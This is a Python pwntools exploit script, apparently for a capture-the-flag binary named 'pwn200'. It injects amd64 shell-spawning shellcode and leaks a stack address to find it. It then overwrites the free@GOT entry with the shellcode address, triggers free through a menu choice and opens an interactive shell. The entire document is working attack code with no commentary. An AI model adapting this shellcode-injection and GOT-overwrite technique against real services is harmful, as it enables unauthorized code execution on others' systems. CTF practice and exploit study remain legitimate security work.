from pwn import *

context.log_level='debug'

free_got = 0x0000000000602018

DEBUG = 1

if DEBUG:
	p = process('./pwn200')
else:
	pass

shellcode = asm(shellcraft.amd64.linux.sh(), arch = 'amd64')

p.recvuntil("u?\n")
p.send(shellcode.ljust(0x30, 'a'))
p.recvuntil(shellcode.ljust(0x30, 'a'))
leak_addr = u64(p.recv(6).ljust(8, '\x00'))
shellcode_addr = leak_addr - 0x50
print "shellcode_addr = " + hex(shellcode_addr)
p.recvuntil("id ~~?\n")
p.sendline("12")

p.recvuntil("money~\n")
p.send(p64(shellcode_addr).ljust(56, 'a') + p64(free_got))

p.recvuntil("your choice : ")
p.sendline("2")

p.interactive()











